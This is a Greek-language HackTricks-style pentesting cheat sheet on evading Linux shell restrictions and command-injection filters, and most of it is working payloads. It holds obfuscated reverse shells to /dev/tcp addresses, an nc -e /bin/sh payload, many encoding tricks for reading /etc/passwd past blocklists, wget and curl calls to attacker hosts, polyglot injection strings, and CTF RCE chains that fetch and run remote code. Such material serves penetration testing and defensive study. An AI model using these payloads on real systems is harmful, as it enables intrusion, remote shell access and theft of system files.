# Παράκαμψη περιορισμών Linux

{{#include ../../../banners/hacktricks-training.md}}

## Παρακάμψεις κοινών περιορισμών

Οι συλλογές για command-injection και WAF-evasion στο PayloadsAllTheThings, το cheat sheet του Bo0oM και τα δύο συνδεδεμένα άρθρα του Secjuice παρέχουν το απαραίτητο υπόβαθρο για τις παραλλαγές σύνταξης shell αυτής της ενότητας.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[4]](#references)</sup>

Για να εντοπίσετε ένα shell sink και να επιβεβαιώσετε την τυφλή εκτέλεση, δείτε το [Command Injection](../../../pentesting-web/command-injection.md).

### Reverse Shell

```bash
# Double-Base64 payload
echo "echo $(echo 'bash -i >& /dev/tcp/10.10.14.8/4444 0>&1' | base64 | base64)|ba''se''6''4 -''d|ba''se''64 -''d|b''a''s''h" | sed 's/ /${IFS}/g'
# echo${IFS}WW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE1DNHhNQzR4TkM0NEx6UTBORFFnTUQ0bU1Rbz0K|ba''se''6''4${IFS}-''d|ba''se''64${IFS}-''d|b''a''s''h
```

### Short Rev shell

```bash
#Trick from Dikline
#Get a rev shell with
(sh)0>/dev/tcp/10.10.10.10/443
#Then get the out of the rev shell executing inside of it:
exec >&0
```

### Bypass διαδρομές και απαγορευμένες λέξεις

```bash
# Question mark binary substitution
/usr/bin/p?ng # /usr/bin/ping
nma? -p 80 localhost # /usr/bin/nmap -p 80 localhost

# Wildcard(*) binary substitution
/usr/bin/who*mi # /usr/bin/whoami

# Wildcard + local directory arguments
touch -- -la # -- stops processing options after the --
ls *
echo * #List current files and folders with echo and wildcard

# [chars]
/usr/bin/n[c] # /usr/bin/nc

# Quotes
'p'i'n'g # ping
"w"h"o"a"m"i # whoami
ech''o test # echo test
ech""o test # echo test
bas''e64 # base64

#Backslashes
\u\n\a\m\e \-\a # uname -a
/\b\i\n/////s\h

# $@
who$@ami #whoami

# Transformations (case, reverse, base64)
$(tr "[A-Z]" "[a-z]"<<<"WhOaMi") #whoami -> Upper case to lower case
$(a="WhOaMi";printf %s "${a,,}") #whoami -> transformation (only bash)
$(rev<<<'imaohw') #whoami
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==) #base64

# Execution through $0
echo whoami|$0

# Uninitialized variables: A uninitialized variable equals to null (nothing)
cat$u /etc$u/passwd$u # Use the uninitialized variable without {} before any symbol
p${u}i${u}n${u}g # Equals to ping, use {} to put the uninitialized variables between valid characters

# New lines
p\
i\
n\
g # These 4 lines will equal to ping

# Fake commands
p$(u)i$(u)n$(u)g # Equals to ping but 3 errors trying to execute "u" are shown
w`u`h`u`o`u`a`u`m`u`i # Equals to whoami but 5 errors trying to execute "u" are shown

# Concatenation of strings using history
!-1 # This will be substitute by the last command executed, and !-2 by the penultimate command
mi # This will throw an error
whoa # This will throw an error
!-1!-2 # This will execute whoami
```

### Bypass απαγορευμένων κενών

```bash
# {form}
{cat,lol.txt} # cat lol.txt
{echo,test} # echo test

# IFS - Internal field separator, change " " for any other character ("]" in this case)
cat${IFS}/etc/passwd # cat /etc/passwd
cat$IFS/etc/passwd # cat /etc/passwd

# Put the command line in a variable and then execute it
IFS=];b=wget]10.10.14.21:53/lol]-P]/tmp;$b
IFS=];b=cat]/etc/passwd;$b # Using 2 ";"
IFS=,;`cat<<<cat,/etc/passwd` # Using cat twice
#  Other way, just change each space for ${IFS}
echo${IFS}test

# Using hex format
X=$'cat\x20/etc/passwd'&&$X

# Using tabs
echo "ls\x09-l" | bash

# Undefined variables and !
$u $u # This will be saved in the history and can be used as a space, please notice that the $u variable is undefined
uname!-1\-a # This equals to uname -a
```

### Παράκαμψη της ανάστροφης κάθετου και της κάθετου

```bash
cat ${HOME:0:1}etc${HOME:0:1}passwd
cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
```

### Παράκαμψη pipes

```bash
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
```

### Παράκαμψη με hex encoding

```bash
echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"
cat `echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"`
abc=$'\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64';cat "$abc"
`echo $'cat\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64'`
cat `xxd -r -p <<< 2f6574632f706173737764`
xxd -r -ps <(echo 2f6574632f706173737764)
cat `xxd -r -ps <(echo 2f6574632f706173737764)`
```

### Ονόματα εντολών χωρίς γράμματα με οκταδική παράθεση

Η παράθεση ANSI-C `$'...'` του Bash αποκωδικοποιεί οκταδικές ακολουθίες διαφυγής κατά τη δημιουργία μιας λέξης εντολής.<sup>[[7]](#references)</sup>

Έτσι, μια λίστα αποκλεισμού γραμμάτων μπορεί να αποτύχει αν εξακολουθεί να επιτρέπει τα `$`, μονά εισαγωγικά, ανάστροφες κάθετους, ψηφία και έναν διαχωριστή εντολών. Αυτό δεν παρακάμπτει την επικύρωση εισόδου που περνά ως σωστά παρατεθειμένο όρισμα δεδομένων.<sup>[[13]](#references)</sup>

Σε αυτήν την τοπική δοκιμή, το `:` αντιπροσωπεύει την προηγούμενη εντολή και το `\151\144` αποκωδικοποιείται σε `id`.<sup>[[7]](#references)</sup> Τα ορίσματα μπορούν να κωδικοποιηθούν ως ξεχωριστές λέξεις, όταν υπάρχει διαθέσιμος διαχωριστής λέξεων.<sup>[[13]](#references)</sup>

```bash
:;$'\151\144'
```

### Παράκαμψη IPs

```bash
# Decimal IPs
127.0.0.1 == 2130706433
```

### Εξαγωγή δεδομένων βάσει χρόνου

```bash
time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
```

### Λήψη χαρακτήρων από μεταβλητές περιβάλλοντος

```bash
echo ${LS_COLORS:10:1} #;
echo ${PATH:0:1} #/
```

### Εξαγωγή δεδομένων DNS

Για callbacks εκτός ζώνης (out-of-band), μια υπηρεσία τύπου Collaborator, όπως το Burp Collaborator, μπορεί να προκαλέσει την επικοινωνία μιας εφαρμογής-στόχου με εξωτερικό διακομιστή· ο υπάρχων σύνδεσμος [**pingb**](http://pingb.in) διατηρείται ως ιστορική πλοήγηση και όχι ως ισχυρισμός για την τρέχουσα διαθεσιμότητά του.<sup>[[6]](#references)</sup>

### Ενσωματωμένες εντολές

Σε ένα περιορισμένο shell, οι διαθέσιμες ενσωματωμένες εντολές είναι ό,τι απομένει από τις δυνατότητες εκτέλεσης εντολών για αυτά τα παραδείγματα· το Bash τεκμηριώνει τις ενσωματωμένες εντολές και τη γραμματική εκτέλεσής τους.<sup>[[7]](#references)</sup> Ιδέα από το [**devploit**](https://twitter.com/devploit).\
Ξεκινήστε από την υπάρχουσα πλοήγηση για τις [**ενσωματωμένες εντολές του shell**](https://www.gnu.org/software/bash/manual/html_node/Shell-Builtin-Commands.html) και δοκιμάστε έπειτα τις ακόλουθες τεχνικές ειδικά για το Bash:<sup>[[7]](#references)</sup>

```bash
# Get list of builtins
declare builtins

# In these cases PATH won't be set, so you can try to set it
PATH="/bin" /bin/ls
export PATH="/bin"
declare PATH="/bin"
SHELL=/bin/bash

# Hex
$(echo -e "\x2f\x62\x69\x6e\x2f\x6c\x73")
$(echo -e "\x2f\x62\x69\x6e\x2f\x6c\x73")

# Input
read aaa; exec $aaa #Read more commands to execute and execute them
read aaa; eval $aaa

# Get "/" char using printf and env vars
printf %.1s "$PWD"
## Execute /bin/ls
$(printf %.1s "$PWD")bin$(printf %.1s "$PWD")ls
## To get several letters you can use a combination of printf and
declare
declare functions
declare historywords

# Read flag in current dir
source f*
flag.txt:1: command not found: CTF{asdasdasd}

# Read file with read
while read -r line; do echo $line; done < /etc/passwd

# Get env variables
declare

# Get history
history
declare history
declare historywords

# Disable special builtins chars so you can abuse them as scripts
[ #[: ']' expected
## Disable "[" as builtin and enable it as script
enable -n [
echo -e '#!/bin/bash\necho "hello!"' > /tmp/[
chmod +x [
export PATH=/tmp:$PATH
if [ "a" ]; then echo 1; fi # Will print hello!
```

### Polyglot command injection

```bash
1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/
```

### Παράκαμψη πιθανών regexes

```bash
# A regex that only allow letters and numbers might be vulnerable to new line characters
1%0a`curl http://attacker.com`
```

### Bashfuscator

Η ακόλουθη κλήση χρησιμοποιεί το Bashfuscator, ένα framework ανοιχτού κώδικα για obfuscation του Bash· ο σύνδεσμος του αποθετηρίου στο σχόλιο κώδικα διατηρείται για πλοήγηση.<sup>[[8]](#references)</sup>

```bash
# From https://github.com/Bashfuscator/Bashfuscator
./bashfuscator -c 'cat /etc/passwd'
```

### RCE με 5 χαρακτήρες

Τα παρακάτω δύο ιστορικά παραδείγματα 5 χαρακτήρων διατηρούνται ως αναπαραγωγές challenge: το κύριο αποθετήριο challenge είναι διαθέσιμο στο [αποθετήριο του Orange Tsai](https://github.com/orangetw/My-CTF-Web-Challenges), ενώ ο δεύτερος σύνδεσμος write-up στο code block είναι στοιχείο πλοήγησης, του οποίου η τρέχουσα διαθεσιμότητα δεν επαληθεύτηκε.<sup>[[9]](#references)</sup>

```bash
# From the Orange Tsai BabyFirst Revenge challenge: https://github.com/orangetw/My-CTF-Web-Challenges#babyfirst-revenge
#Orange Tsai solution
## Step 1: generate `ls -t>g` to file "_" to be able to execute ls ordening names by cration date
http://host/?cmd=>ls\
http://host/?cmd=ls>_
http://host/?cmd=>\ \
http://host/?cmd=>-t\
http://host/?cmd=>\>g
http://host/?cmd=ls>>_

## Step2: generate `curl orange.tw|python` to file "g"
## by creating the necesary filenames and writting that content to file "g" executing the previous generated file
http://host/?cmd=>on
http://host/?cmd=>th\
http://host/?cmd=>py\
http://host/?cmd=>\|\
http://host/?cmd=>tw\
http://host/?cmd=>e.\
http://host/?cmd=>ng\
http://host/?cmd=>ra\
http://host/?cmd=>o\
http://host/?cmd=>\ \
http://host/?cmd=>rl\
http://host/?cmd=>cu\
http://host/?cmd=sh _
# Note that a "\" char is added at the end of each filename because "ls" will add a new line between filenames whenwritting to the file

## Finally execute the file "g"
http://host/?cmd=sh g


# Another solution from https://infosec.rm-it.de/2017/11/06/hitcon-2017-ctf-babyfirst-revenge/
# Instead of writing scripts to a file, create an alphabetically ordered the command and execute it with "*"
https://infosec.rm-it.de/2017/11/06/hitcon-2017-ctf-babyfirst-revenge/
## Execute tar command over a folder
http://52.199.204.34/?cmd=>tar
http://52.199.204.34/?cmd=>zcf
http://52.199.204.34/?cmd=>zzz
http://52.199.204.34/?cmd=*%20/h*

# Another curiosity if you can read files of the current folder
ln /f*
## If there is a file /flag.txt that will create a hard link
## to it in the current folder
```

### RCE με 4 χαρακτήρες

```bash
# In a similar fashion to the previous bypass this one just need 4 chars to execute commands
# it will follow the same principle of creating the command `ls -t>g` in a file
# and then generate the full command in filenames
# generate "g> ht- sl" to file "v"
'>dir'
'>sl'
'>g\>'
'>ht-'
'*>v'

# reverse file "v" to file "x", content "ls -th >g"
'>rev'
'*v>x'

# generate "curl orange.tw|python;"
'>\;\\'
'>on\\'
'>th\\'
'>py\\'
'>\|\\'
'>tw\\'
'>e.\\'
'>ng\\'
'>ra\\'
'>o\\'
'>\ \\'
'>rl\\'
'>cu\\'

# got shell
'sh x'
'sh g'
```

## Παράκαμψη read-only/noexec/Distroless

Αν βρίσκεστε μέσα σε ένα filesystem με προστασίες **read-only και noexec** ή σε ένα **Distroless image**, το περιβάλλον επιβάλλει περιορισμούς εκτέλεσης που τεκμηριώνονται από το Linux `mount(8)` και το project Distroless· η συνδεδεμένη σελίδα συγκεντρώνει τεχνικές για να εργαστείτε εντός αυτών των περιορισμών.<sup>[[11]](#references)[[12]](#references)</sup>

{{#ref}}
bypass-fs-protections-read-only-no-exec-distroless/
{{#endref}}

## Παράκαμψη Chroot και άλλων Jails

{{#ref}}
../../main-system-information/escaping-from-limited-bash.md
{{#endref}}

## Bash NOP Sled βασισμένο σε κενά ("Bashsledding")

Όταν ένα vulnerability σάς επιτρέπει να ελέγχετε εν μέρει ένα όρισμα που τελικά φτάνει στη `system()` ή σε κάποιο άλλο shell, η θέση του payload μπορεί να είναι αβέβαιη. Οι Alan Cao και Will Tan περιγράφουν μια περίπτωση περιορισμένης embedded συσκευής, όπου ένα payload για shell εγγράφηκε επανειλημμένα στη memory-mapped NVRAM και προηγήθηκαν αυτού κενά.<sup>[[5]](#references)</sup>

Επομένως, μπορείτε να δημιουργήσετε ένα *NOP sled για Bash* προτάσσοντας στην πραγματική εντολή σας μια μεγάλη ακολουθία κενών ή χαρακτήρων tab· το Bash ορίζει τα κενά και τους χαρακτήρες tab ως blanks που διαχωρίζουν λέξεις σε μια απλή εντολή.<sup>[[5]](#references)[[7]](#references)</sup>

```bash
# Payload sprayed into an environment variable / NVRAM entry
"                nc -e /bin/sh 10.0.0.1 4444"
# 16× spaces ───┘ ↑ real command
```

Αν μια αλυσίδα ROP (ή κάποιο άλλο primitive αλλοίωσης μνήμης) περάσει έναν δείκτη συμβολοσειράς εντολής που αρχίζει οπουδήποτε μέσα στο μπλοκ κενών, το Bash μπορεί να αναλύσει τα υπόλοιπα αρχικά κενά μέχρι να φτάσει στην εντολή· στο router exploit που παρατίθεται, αυτό επέτρεψε να χρησιμοποιηθούν αβέβαιες μετατοπίσεις συμβολοσειρών.<sup>[[5]](#references)[[7]](#references)</sup>

Πρακτικές περιπτώσεις χρήσης σε περιορισμένους embedded στόχους περιλαμβάνουν:<sup>[[5]](#references)</sup>

1. **Blobs διαμόρφωσης με αντιστοίχιση στη μνήμη** (π.χ. NVRAM), στα οποία έχουν πρόσβαση διαφορετικές διεργασίες.<sup>[[5]](#references)</sup>
2. Κανάλια payload στα οποία ο επιτιθέμενος δεν μπορεί να γράψει bytes NULL για να ευθυγραμμίσει το payload (μια γενική προσαρμογή του προβλήματος ευθυγράμμισης).<sup>[[5]](#references)</sup>
3. Embedded συσκευές με περιβάλλον `ash`/`sh` του BusyBox, το οποίο το BusyBox τεκμηριώνει ως applets για συστήματα με περιορισμένους πόρους.<sup>[[10]](#references)</sup>

> 🛠️  Συνδυάστε αυτήν την τεχνική με ROP gadgets που καλούν τη `system()` σε ελεγχόμενο lab· η έρευνα για router που παρατίθεται παρουσιάζει αυτόν τον συνδυασμό σε περιορισμένο hardware.<sup>[[5]](#references)</sup>



## References

- [1] [PayloadsAllTheThings - Command Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits)
- [2] [Bo0oM - WAF-bypass-Cheat-Sheet](https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet)
- [3] [Τεχνικές παράκαμψης Web Application Firewall (WAF) #2 - theMiddle](https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0)
- [4] [Τεχνικές παράκαμψης Web Application Firewall (WAF) #3 - theMiddle](https://www.secjuice.com/web-application-firewall-waf-evasion/)
- [5] [Alan Cao και Will Tan — Εκμετάλλευση zero-days σε εγκαταλελειμμένο hardware – ιστολόγιο Trail of Bits](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [6] [Burp Collaborator - PortSwigger](https://portswigger.net/burp/documentation/desktop/tools/collaborator)
- [7] [bash(1) — σελίδα εγχειριδίου Linux](https://man7.org/linux/man-pages/man1/bash.1.html)
- [8] [Bashfuscator](https://github.com/Bashfuscator/Bashfuscator)
- [9] [My-CTF-Web-Challenges — Orange Tsai](https://github.com/orangetw/My-CTF-Web-Challenges)
- [10] [BusyBox](https://busybox.net/downloads/BusyBox.html)
- [11] [mount(8) — σελίδα εγχειριδίου Linux](https://man7.org/linux/man-pages/man8/mount.8.html)
- [12] [Distroless](https://github.com/GoogleContainerTools/distroless)
- [13] [Dojo CTF #36: περιγραφή λύσης Shell Escape — YesWeHack](https://www.yeswehack.com/dojo/dojo-ctf-challenge-winners-36)
{{#include ../../../banners/hacktricks-training.md}}
